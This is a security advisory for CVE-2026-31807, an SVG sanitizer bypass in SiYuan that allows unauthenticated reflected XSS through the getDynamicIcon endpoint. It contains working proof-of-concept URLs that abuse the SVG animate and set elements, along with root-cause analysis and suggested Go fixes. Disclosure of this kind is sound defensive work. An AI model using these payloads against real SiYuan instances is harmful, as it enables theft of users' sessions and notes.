# [M] SiYuan has a SVG Sanitizer Bypass via `<animate>` Element — Unauthenticated XSS

## Summary
Severity: Medium
Advisory: GHSA-5hc8-qmg8-pw27
CVE: CVE-2026-31807
CWE: CWE-79
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:N/SC:H/SI:H/SA:N (CVSS_V4)
Published: 2026-03-10
Source: https://github.com/advisories/GHSA-5hc8-qmg8-pw27
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0 <0.0.0-20260310025236-297bd526708f

## Details
# SVG Sanitizer Bypass via `<animate>` Element — Unauthenticated XSS

## Summary

SiYuan's SVG sanitizer (`SanitizeSVG`) blocks dangerous elements (`<script>`, `<iframe>`, `<foreignobject>`) and removes `on*` event handlers and `javascript:` in `href` attributes. However, it does NOT block SVG animation elements (`<animate>`, `<set>`) which can dynamically set attributes to dangerous values at runtime, bypassing the static sanitization. This allows an attacker to inject executable JavaScript into the unauthenticated `/api/icon/getDynamicIcon` endpoint (type=8), creating a reflected XSS.

This is a bypass of the fix for CVE-2026-29183 (fixed in v3.5.9).

## Affected Component

- **File:** `kernel/util/misc.go`
- **Function:** `SanitizeSVG()` (lines 234-319)
- **Endpoint:** `GET /api/icon/getDynamicIcon?type=8&content=...` (unauthenticated)
- **Version:** SiYuan <= 3.5.9

## Root Cause

The sanitizer checks attributes on elements at **parse time**. SVG `<animate>` and `<set>` elements modify attributes **at runtime** — these elements are not in the sanitizer's blocklist.

### Sanitizer's blocklist (line 250)

```go
if tag == "script" || tag == "iframe" || tag == "object" || tag == "embed" || tag == "foreignobject" {
    n.RemoveChild(c)
    // ...
}
```

Missing from blocklist: `animate`, `set`, `animateTransform`, `animateMotion`

### Attribute check (lines 264-267)

```go
// Only checks static attributes
if strings.HasPrefix(key, "on") {
    continue
}
```

The `<animate>` element's `values` attribute contains the payload (`javascript:...`), but the sanitizer only checks for `on*` prefix, `href`, or `xlink:href` keys. The `values`, `to`, `from`, `attributeName` attributes are all passed through.

## Proof of Concept

### Vector 1: `<animate>` sets `href` to `javascript:`

```
GET /api/icon/getDynamicIcon?type=8&content=</text><a><animate attributeName="href" values="javascript:alert(document.domain)" begin="0s" fill="freeze"/><text x="50%25" y="80%25" fill="red" style="font-size:60px">Click me</text></a><text>&color=blue
```

After template rendering, the SVG contains:
```xml
<svg ...>
    <text ...></text>
    <a>
        <animate attributeName="href" values="javascript:alert(document.domain)" begin="0s" fill="freeze"/>
        <text x="50%" y="80%" fill="red" style="font-size:60px">Click me</text>
    </a>
    <text></text>
</svg>
```

The sanitizer passes this through because:
1. `<animate>` is not in the element blocklist
2. `attributeName="href"` — key is `attributename`, doesn't start with `on`, not `href` itself
3. `values="javascript:..."` — key is `values`, not `href`

When the SVG is rendered in the browser (navigating directly to the URL), `<animate>` sets the parent `<a>` element's `href` to `javascript:alert(document.domain)`. Clicking "Click me" triggers the JavaScript.

### Vector 2: `<set>` modifies event handlers

```
GET /api/icon/getDynamicIcon?type=8&content=</text><set attributeName="onmouseover" to="alert(document.domain)"/><text>&color=blue
```

The `<set>` element dynamically adds an `onmouseover` event handler to the parent element at runtime.

## Attack Scenario

1. Attacker crafts a malicious `getDynamicIcon` URL with XSS payload
2. Attacker sends the URL to a victim who has an active SiYuan session
3. Victim clicks/navigates to the URL
4. SVG renders with Content-Type `image/svg+xml` — browser renders as standalone SVG document
5. JavaScript executes in the SiYuan server's origin
6. Attacker steals session cookies, API tokens, or makes authenticated API calls to read/modify notes

## Impact

- **Severity:** CRITICAL (CVSS ~9.1)
- **Type:** CWE-79 (Improper Neutralization of Input During Web Page Generation)
- Unauthenticated reflected XSS via SVG injection
- Executes in the SiYuan application origin, giving full access to authenticated APIs
- Can chain to: data exfiltration, note modification, configuration theft (API tokens, auth codes)
- Bypasses the fix for CVE-2026-29183

## Suggested Fix

Add animation elements to the sanitizer blocklist:

```go
// In SanitizeSVG, line 250:
if tag == "script" || tag == "iframe" || tag == "object" || tag == "embed" ||
   tag == "foreignobject" || tag == "animate" || tag == "set" ||
   tag == "animatetransform" || tag == "animatemotion" {
    n.RemoveChild(c)
    c = next
    continue
}
```

Or additionally check the `values`, `to`, and `from` attributes for `javascript:` patterns:

```go
if key == "values" || key == "to" || key == "from" {
    if strings.Contains(val, "javascript:") {
        continue
    }
}
```

Also consider checking `attributeName` — if it targets `href`, `xlink:href`, or any `on*` attribute, the animation element should be removed entirely.

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-5hc8-qmg8-pw27
- https://nvd.nist.gov/vuln/detail/CVE-2026-31807
- https://github.com/siyuan-note/siyuan
- https://github.com/siyuan-note/siyuan/releases/tag/v3.5.10
